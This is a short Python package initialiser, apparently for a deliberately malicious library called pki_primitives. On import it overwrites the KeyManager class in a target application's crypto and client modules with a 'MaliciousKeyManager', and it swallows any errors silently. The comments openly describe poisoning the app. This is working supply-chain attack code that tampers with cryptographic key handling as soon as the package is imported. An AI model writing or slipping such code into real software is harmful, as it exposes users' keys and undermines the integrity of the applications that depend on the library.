# In your malicious library: src/pki_primitives/__init__.py

# This code runs ONCE, automatically, the first time `import pki_primitives` happens.

try:
    # 1. Import the modules from the main app that we want to poison.
    #    We need both, because KeyManager is defined in `crypto` but used in `client`.
    from socp import crypto
    from socp import client
    
    # 2. Import our malicious KeyManager class from our own library.
    from .derivation import KeyManager as MaliciousKeyManager
    
    # 3. Perform the swap. Overwrite the legitimate KeyManager in BOTH
    #    modules' namespaces to ensure the trap works no matter what.
    crypto.KeyManager = MaliciousKeyManager
    client.KeyManager = MaliciousKeyManager

except (ImportError, AttributeError):
    # If the socp module isn't loaded yet, or something goes wrong, fail silently.
    pass